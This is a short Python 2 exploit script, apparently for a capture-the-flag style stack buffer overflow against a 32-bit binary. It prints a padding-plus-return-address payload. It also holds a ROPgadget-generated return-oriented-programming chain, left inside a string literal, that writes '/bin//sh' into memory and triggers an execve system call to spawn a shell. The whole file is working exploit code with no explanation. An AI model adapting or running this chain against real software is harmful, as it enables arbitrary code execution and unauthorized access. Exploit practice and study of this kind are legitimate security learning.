#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack

def shell():
	p = ''
        p += 'A'*48
	p += pack('<I', 0xdeadbeef)
	print p
'''
	p += pack('<I', 0x0808425a) # pop edx ; ret
	p += pack('<I', 0x080ff060) # @ .data
	p += pack('<I', 0x080ccda6) # pop eax ; ret
	p += '/bin'
	p += pack('<I', 0x080acd8d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0808425a) # pop edx ; ret
	p += pack('<I', 0x080ff064) # @ .data + 4
	p += pack('<I', 0x080ccda6) # pop eax ; ret
	p += '//sh'
	p += pack('<I', 0x080acd8d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0808425a) # pop edx ; ret
	p += pack('<I', 0x080ff068) # @ .data + 8
	p += pack('<I', 0x0805ebb0) # xor eax, eax ; ret
	p += pack('<I', 0x080acd8d) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080481e9) # pop ebx ; ret
	p += pack('<I', 0x080ff060) # @ .data
	p += pack('<I', 0x08084281) # pop ecx ; pop ebx ; ret
	p += pack('<I', 0x080ff068) # @ .data + 8
	p += pack('<I', 0x080ff060) # padding without overwrite ebx
	p += pack('<I', 0x0808425a) # pop edx ; ret
	p += pack('<I', 0x080ff068) # @ .data + 8
	p += pack('<I', 0x0805ebb0) # xor eax, eax ; ret
	p += pack('<I', 0x08090caf) # inc eax ; ret
	p += pack('<I', 0x08090caf) # inc eax ; ret
	p += pack('<I', 0x08090caf) # inc eax ; ret
	p += pack('<I', 0x08090caf) # inc eax ; ret
	p += pack('<I', 0x08090caf) # inc eax ; ret
	p += pack('<I', 0x08090caf) # inc eax ; ret
	p += pack('<I', 0x08090caf) # inc eax ; ret
	p += pack('<I', 0x08090caf) # inc eax ; ret
	p += pack('<I', 0x08090caf) # inc eax ; ret
	p += pack('<I', 0x08090caf) # inc eax ; ret
	p += pack('<I', 0x08090caf) # inc eax ; ret
	p += pack('<I', 0x08052a11) # int 0x80
        print p
'''

shell()

